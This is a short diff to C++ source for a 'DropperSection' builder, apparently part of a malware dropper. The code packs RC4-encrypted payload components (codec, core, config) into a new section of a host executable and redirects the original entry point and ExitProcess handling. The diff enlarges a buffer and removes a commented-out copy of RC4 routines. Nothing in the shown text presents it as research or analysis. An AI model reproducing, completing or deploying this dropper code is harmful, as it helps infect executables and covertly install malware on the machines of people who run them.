@@ -37,7 +37,7 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 {
 	DWORD dataBufferSize = 0;
 	
-	unsigned int buffer_size = 32768 // account for header and accessory data (strings, calls, etc)
+	unsigned int buffer_size = 65535 // account for header and accessory data (strings, calls, etc)
 		+ _files.codec.size
 		+ _files.core.size
 		+ _files.config.size
@@ -59,13 +59,13 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 	cout << "Key       : " << rc4_key << endl;
 	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
 	
-	// Header
+	// Original EP
 	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
 	
 	// ExitProcess index
 	header->exitProcessIndex = _exitProcessIndex;
 	header->exitIndex = _exitIndex;
-	
+		
 	// Strings offsets
 	header->stringsOffsets.offset = ptr - _data;
 	DWORD * strOffset = (DWORD *) ptr;
@@ -266,26 +266,6 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 	//
 	// RC4
 	//
-	
-	/*
-	// RC4Init code
-	DWORD RC4InitSBoxSize = (DWORD) RC4InitSBox_End - (DWORD) RC4InitSBox;
-	memcpy(ptr, (PBYTE) RC4InitSBox, RC4InitSBoxSize);
-	header->functions.RC4InitSBox.offset = ptr - _data;
-	header->functions.RC4InitSBox.size = RC4InitSBoxSize;
-	ptr += RC4InitSBoxSize;
-
-	cout << "RC4InitSBox is " << RC4InitSBoxSize << " bytes long, offset " << header->functions.RC4InitSBox.offset << endl;
-
-	// RC4Crypt code
-	DWORD RC4CryptSize = (DWORD) RC4Crypt_End - (DWORD) RC4Crypt;
-	memcpy(ptr, (PBYTE) RC4Crypt, RC4CryptSize);
-	header->functions.RC4Crypt.offset = ptr - _data;
-	header->functions.RC4Crypt.size = RC4CryptSize;
-	ptr += RC4CryptSize;
-
-	cout << "RC4Crypt is " << RC4CryptSize << " bytes long, offset " << header->functions.RC4Crypt.offset << endl;
-	*/
 	
 	DWORD rc4Size = (DWORD) rc4_skip_End - (DWORD) rc4_skip;
 	memcpy(ptr, rc4_skip, rc4Size);
